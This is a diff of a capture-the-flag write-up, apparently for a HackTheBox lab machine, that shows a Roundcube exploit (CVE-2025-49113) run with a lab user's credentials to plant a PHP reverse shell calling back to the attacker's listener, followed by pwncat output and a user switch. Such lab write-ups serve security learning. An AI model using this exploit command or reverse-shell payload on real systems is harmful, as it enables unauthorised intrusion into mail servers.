@@ -100,4 +100,34 @@ php -r '\$s=fsockopen(\"$tun0\",4444);\$p=proc_open(\"/bin/sh\",[0=>\$s,1=>\$s,2
 ```
 Where $tun0 is my vpn ip and 4444 is the port i am listening on.
 
-I got a reverse shell on my pwncat shell
+Final command to get the shell
+
+```bash
+php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "php -r '\$s=fsockopen(\"10.10.16.11\",4444);\$p=proc_open(\"/bin/sh\",[0=>\$s,1=>\$s,2=>\$s],\$pipes);'"
+```
+
+I got a reverse shell on my pwncat shell (You can also use Netcat).
+
+```bash
+pwncat-cs -lp 4444
+```
+
+Output
+```bash
+[20:58:28] 10.10.11.77:44592: upgrading from /usr/bin/dash to /usr/bin/bash                                                                                                     manager.py:957
+[20:58:32] 10.10.11.77:44592: registered new host w/ db                                                                                                                         manager.py:957
+[20:58:40] listener: 0.0.0.0:4444: linux session from 10.10.11.77:44592 established                                                                                             manager.py:957
+```
+
+Hit Ctrl + d
+
+We got a shell from the user www-data!
+
+### Escaping the docker
+
+* First lets switch user to Tyler since we know the password and we can enumerate further for any privilege escalation vector 
+```bash
+www-data@mail.outbound.htb:/var/www/html/roundcube/public_html$ su tyler
+```
+
+Enter the password of tyler and boom!
